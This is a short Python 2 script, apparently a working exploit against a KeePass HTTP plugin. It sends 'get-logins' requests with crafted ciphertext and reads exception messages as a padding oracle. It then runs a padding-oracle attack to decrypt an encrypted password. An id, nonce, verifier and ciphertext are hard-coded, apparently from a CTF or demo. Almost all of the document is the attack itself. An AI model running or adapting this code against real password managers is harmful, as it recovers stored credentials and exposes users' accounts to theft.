#!/usr/bin/env python2
from keepass_client import Keepass
from binascii import hexlify, unhexlify
from base64 import b64encode, b64decode
from oracle import Oracle
from ipdb import set_trace

class KeepassExploit(Keepass):

    def __init__(self, id, nonce, verifier):
        super(KeepassExploit, self).__init__()
        self.id = id
        self.nonce = nonce
        self.verifier = verifier

    def get_login(self, url):
        url = b64encode(url)
        data = {'RequestType': 'get-logins',
                'Nonce': self.nonce,
                'Verifier': self.verifier,
                'Url': url,
                'Id': self.id,
                'TriggerUnlock': False,

        }
        response = self.session.post(self.endpoint, json=data)
        #print(response.text)
        #print(response.status_code)
        if "System.ArgumentException" in response.text:
            return True
        return response.status_code == 200

def oracle_padding_test(k):
    print("Testing for oracle")
    for i in range(256):
        cipher = 15*"A" + chr(i) + 16*"B" 
        print(hexlify(cipher)[:32], hexlify(cipher)[-32:])
        if k.get_login(cipher):
            print("Got our oracle. No Padding Exception for %s" % hex(i))
            break


def oracle_padding_exploit(iv, password_enc):
    Oracle(b64decode(password_enc), 16, k.get_login, True, b64decode(iv))

if __name__ == '__main__':
    id = "mrmcd"
    nonce = "8u7ZtoLBNidAgj6tMXwb0w=="
    verifier = "WHRozTDgj4ZBSyfJd1k9wHOu5I7A6LCmdJOthps4isw="
    password_enc = "dCykrcRtAeE8yW8gNMLJOz98bdZpsKZ8+6/zn8wPZoz3k4kQVyhvoWbvMnMGFN55"
    
    k = KeepassExploit(id, nonce, verifier)
    oracle_padding_test(k)
    oracle_padding_exploit(nonce, password_enc)
